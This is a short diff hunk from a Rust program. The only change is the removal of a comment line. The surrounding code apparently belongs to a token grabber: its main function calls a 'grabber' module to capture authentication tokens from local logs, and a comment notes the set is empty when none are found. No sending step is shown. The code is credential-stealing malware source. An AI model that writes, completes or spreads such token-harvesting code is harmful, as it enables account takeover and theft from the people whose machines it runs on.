@@ -58,7 +58,7 @@ async fn main () {
         Client,
         grabber
     };
-    // this need 
+
     // capturing tokens from local logs
     // [the Set will be empty if it couldn't find any tokens]
     let tokens = grabber::capture_tokens_from_logs().unwrap();
